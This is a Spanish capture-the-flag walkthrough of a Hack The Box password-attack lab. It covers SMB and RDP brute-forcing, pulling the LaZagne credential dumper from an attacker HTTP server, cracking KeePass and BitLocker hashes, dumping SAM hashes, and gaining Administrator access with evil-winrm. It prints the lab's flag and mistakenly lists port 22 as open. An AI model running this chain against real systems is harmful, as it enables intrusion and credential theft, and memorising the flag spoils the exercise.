
# Lab de contraseñas - Hard

Al igual que con las evaluaciones anteriores, a nuestro cliente le gustaría asegurarse de que un atacante no pueda obtener acceso a ningún archivo confidencial en caso de un ataque exitoso. Mientras nuestros colegas estaban ocupados con otros hosts de la red, descubrimos que el usuario `Johanna` está presente en muchos hosts. Sin embargo, todavía no hemos podido determinar el propósito exacto o el motivo de esto.

***

## <mark style="color:purple;">Objetivo</mark>

> Examina el tercer objetivo y envía el contenido de `flag.txt` en C:\Users\Administrator\Desktop\ como respuesta.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.129.202.222 -Pn

PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  status        1 (RPC #100024)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Observamos que tiene 6 puertos abiertos, 22, 139 y 445, que se corresponden con y SMB y RDP principalmente, por lo que centraremos el tiro en estos servicios.

## <mark style="color:purple;">Bruteforce de SMB</mark>

```
crackmapexec smb 10.129.202.222 -u johanna -p mut_password.list

SMB         10.129.202.222  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna: STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:! STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:00000 STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:00000! STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:000000 STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:000000! STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:00000001 STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [-] WINSRV\johanna:00000001! STATUS_LOGON_FAILURE 
SMB         10.129.202.222  445    WINSRV           [+] WINSRV\johanna:1231234! 
```

Encontramos unas credenciales válidas de SMB para el usuario johanna, por lo que vamos a empezar a enumerar las carpetas compartidas:

```
crackmapexec smb 10.129.202.222 -u "johanna" -p 1231234! --shares

SMB         10.129.202.222  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.222  445    WINSRV           [+] WINSRV\johanna:1231234! 
SMB         10.129.202.222  445    WINSRV           [+] Enumerated shares
SMB         10.129.202.222  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.222  445    WINSRV           -----           -----------     ------
SMB         10.129.202.222  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.222  445    WINSRV           C$                              Default share
SMB         10.129.202.222  445    WINSRV           david                           
SMB         10.129.202.222  445    WINSRV           IPC$            READ            Remote IPC
```

Encontramos la carpeta compartida IPC$ que tenemos permisos de lectura. También encontramos la carpeta david, lo que nos indica que hay un usuario con ese nombre en el sistema.

No podemos acceder a ninguna carpeta compartida ni ver su contenido, por lo que vamos a probar a hacer bruteforce contra el servicio RDP.

## <mark style="color:purple;">Bruteforce de RDP</mark>

Vamos a probar el bruteforce de RDP contra el usuario johanna:

```
hydra -l johanna -P mut_password.list rdp://10.129.202.222 -t 48
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-22 19:28:53
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 94044 login tries (l:1/p:94044), ~23511 tries per task
[DATA] attacking rdp://10.129.202.222:3389/
[STATUS] 88.00 tries/min, 88 tries in 00:01h, 93957 to do in 17:48h, 3 active
[STATUS] 94.67 tries/min, 284 tries in 00:03h, 93761 to do in 16:31h, 3 active
[STATUS] 94.57 tries/min, 662 tries in 00:07h, 93383 to do in 16:28h, 3 active
[3389][rdp] host: 10.129.202.222   login: johanna   password: 1231234!
```

Parece que utiliza la misma contraseña para acceder a SMB y RDP. Vamos a intentar conectarnos por RDP:

<figure><img src="/files/y9IsRX3AC6NeC8fm8hrg" alt=""><figcaption></figcaption></figure>

Buuumm! Conseguimos acceder correctamente, y podemos empezar a enumerar información. A simple vista parece que utiliza varios navegadores, por lo que podríamos usar Lazagne para intentar extraer contraseñas almacenadas.

Vamos a enviar el ejecutable de lazagne.exe de la siguiente manera:

<pre class="language-shell-session" data-title="En nuestro Kali Linux"><code class="lang-shell-session"><strong>afsh4ck@kali$ ls
</strong>lazagne      lazagne.spec    lazagne.exe  releases    laZagne.py   

afsh4ck@kali$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>

{% code title="En la máquina objetivo" overflow="wrap" %}

```powershell
PS C:\Users\johanna\Desktop> Invoke-WebRequest -Uri 'http://10.10.15.4:80/lazagne.exe' -OutFile 'lazagne.exe'
```

{% endcode %}

<figure><img src="/files/Y3EB09iwKz6uGzB3y4l4" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Lazagne</mark>

Una vez que tenemos lazagne en nuestra máquina objetivo, vamos a ejecutarlo de la siguiente manera:

```powershell
PS C:\Users\johanna\Desktop> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: johanna ##########

------------------- Keepassconfig passwords -----------------

[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\johanna\Documents\Logins.kdbx
Type: Password

[+] 1 passwords have been found.
For more information launch it again with the -v option
```

Lazagne nos encuentra 1 archivo .kdbx de KeePass con posibles contraseñas almacenadas:

<figure><img src="/files/pJ7RkBfOQq3PCQSm2h1E" alt=""><figcaption></figcaption></figure>

Al introducir la contraseña que tenemos para RDP no funciona, por lo que tendremos que enumerar más información:

<figure><img src="/files/eswaZamgLxrIeLkfrluv" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Keepass2john</mark>

Vamos a descargarnos este archivo `Logins.kdbx` y crackearlo con keepass2john:

```
evil-winrm -i 10.129.202.222 -u johanna -p 1231234!

*Evil-WinRM* PS C:\Users\johanna\Documents> ls

    Directory: C:\Users\johanna\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/11/2022   2:13 AM           2126 Logins.kdbx

*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx
                                        
Info: Downloading C:\Users\johanna\Documents\Logins.kdbx to Logins.kdbx                                   
Info: Download successful!
```

```bash
keepass2john Logins.kdbx > keepass.hash
```

Vamos a usar el diccionario de contraseñas mutadas que hemos utilizado en toda esta sección para crackearlo:

```
john --wordlist=mut_password.list keepass.hash

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty7!         (Logins)  
```

Buuum! Obtenemos la contraseña en plano para este archivo de Keepass: `Qwerty7!`

<figure><img src="/files/QeZJWNGsaJhUgC6sGMop" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/nLQWNZQHRmdhSZoIwz4D" alt=""><figcaption></figcaption></figure>

E voilá! Hemos obtenido la contraseña del usuario david. Click derecho > Copiar contraseña

<figure><img src="/files/9bUis1nn52NFndpd74kZ" alt=""><figcaption></figcaption></figure>

```
User: david
Pass: gRzX7YbeTcDG7
```

Ahora que tenemos las credenciales de david, vamos a empezar a enumerar información

## <mark style="color:purple;">Enumeración de David</mark>

Podemos usar crackmapexec para ver las carpetas compartidas:

```
crackmapexec smb 10.129.202.222 -u david -p gRzX7YbeTcDG7 --shares

SMB         10.129.202.222  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.222  445    WINSRV           [+] WINSRV\david:gRzX7YbeTcDG7 
SMB         10.129.202.222  445    WINSRV           [+] Enumerated shares
SMB         10.129.202.222  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.222  445    WINSRV           -----           -----------     ------
SMB         10.129.202.222  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.222  445    WINSRV           C$                              Default share
SMB         10.129.202.222  445    WINSRV           david           READ            
SMB         10.129.202.222  445    WINSRV           IPC$            READ            Remote IPC
```

Vemos que ahora si, podemos acceder a la carpeta compartida david, con permisos de lectura.

```
smbclient -U david \\\\10.129.202.222\\david
Password for [WORKGROUP\david]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Feb 11 11:43:03 2022
  ..                                  D        0  Fri Feb 11 11:43:03 2022
  Backup.vhd                          A 136315392  Fri Feb 11 13:16:12 2022

		10328063 blocks of size 4096. 6115916 blocks available
smb: \> get Backup.vhd
getting file \Backup.vhd of size 136315392 as Backup.vhd (3411,2 KiloBytes/sec) (average 3411,2 KiloBytes/sec)
smb: \> 
```

Encontramos un archivo de backup que puede contener información valiosa. Vamos a descargarlo.

<figure><img src="/files/Nj1IpX56qoMgdSB42kpm" alt=""><figcaption></figcaption></figure>

Como vemos es un archivo cifrado, y para crackear este tipo de archivo necesitamos `bitlocker2john`.

## <mark style="color:purple;">Cracking con bitlocker2john</mark>

```shell-session
afsh4ck@kali$ bitlocker2john -i Backup.vhd > backup.hashes
afsh4ck@kali$ grep "bitlocker\$0" backup.hashes > backup.hash
afsh4ck@kali$ cat backup.hash                                                   
$bitlocker$0$16$60d83def3e335699830cc42793dae6e5$1048576$12$80b20a04341fd80103000000$60$ae149c9c17975483390d2afb7ff75c3e3380733976fa7d02bb29caebece6076c3c29096fc341a916c79b0db656a1f28e9f186e8b201c38653f64443a
```

```
john --wordlist=mut_password.list backup.hash 

Note: This format may emit false positives, so it will keep trying even after finding a possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (BitLocker, BitLocker [SHA-256 AES 32/64])
Cost 1 (iteration count) is 1048576 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789!       (?) 
```

Obtenemos la contraseña en plano y ya podemos montar esta unidad virtual. Necesitamos montarlo en un sistema windows, por lo que necesitamos acceder por RDP, transferir el archivo de Backup y lo montarlo.

También he encontrado el siguiente artículo donde explica como montarlo en sistemas Linux:

{% embed url="<https://www.linuxuprising.com/2019/04/how-to-mount-bitlocker-encrypted.html>" %}

## <mark style="color:purple;">Montaje de Backup.vhd</mark>

Podemos montarlo en cualquier VM Windows de la siguiente manera:

```shell-session
afsh4ck@kali$ ls
backup.hash  backup.hashes  Backup.vhd  keepass.hash  Logins.kdbx  mut_password.list  password.list  username.list

afsh4ck@kali$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

{% code title="En Windows" %}

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.15.4:80/Backup.vhd','Backup.vhd')
```

{% endcode %}

o por el navegador:

<figure><img src="/files/vp4YJTHgekTk9bIiNiHj" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/Ff39ulsa7Tz1Us1FWr70" alt=""><figcaption></figcaption></figure>

Dentro del disco encontramos 2 archivos: SAM y SYSTEM

<figure><img src="/files/bH9QmqJimuo5kRwtV22R" alt=""><figcaption></figcaption></figure>

Nos enviamos estos dos archivos a nuestra máquina de atacante para extraer los hashes con Impacket

## <mark style="color:purple;">Extracción de hashes</mark>

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up... 
```

Guardamos los hashes, solamente con el hash NTLM de la siguiente manera:

```
e53d4d912d96874e83429886c7bf22a1
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
9e73cc8353847cfce7b5f88061103b43
6ba6aae01bae3868d8bf31421d586153
b20d19ca5d5504a0c9ff7666fbe3ada5
0b8df7c13384227c017efc6db3913374
```

## <mark style="color:purple;">Cracking con Hashcat</mark>

```
sudo hashcat -m 1000 hashestocrack.txt mut_password.list 
[sudo] contraseña para kali: 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

31d6cfe0d16ae931b73c59d7e0c089c0:                         
0b8df7c13384227c017efc6db3913374:1231234!                 
e53d4d912d96874e83429886c7bf22a1:Liverp00l8!              
Approaching final keyspace - workload adjusted.   
```

Nos consigue crackear correctamente 2 hashes, que se corresponden con los usuarios johanna y administrator!

```
johanna: 1231234!
administrator: Liverp00l8!
```

## <mark style="color:purple;">Acceso Root</mark>

```powershell
evil-winrm -i 10.129.202.222 -u administrator -p Liverp00l8!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                     
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls

    Directory: C:\Users\Administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/11/2022   2:42 AM           1348 BitLocker Recovery Key.TXT
-a----        2/11/2022   4:29 AM             21 flag.txt.txt
-a----        2/10/2022   1:34 PM            951 KeePass 2.lnk


*Evil-WinRM* PS C:\Users\Administrator\desktop> cat flag.txt.txt
HTB{PWcr4ck1ngokokok}
```
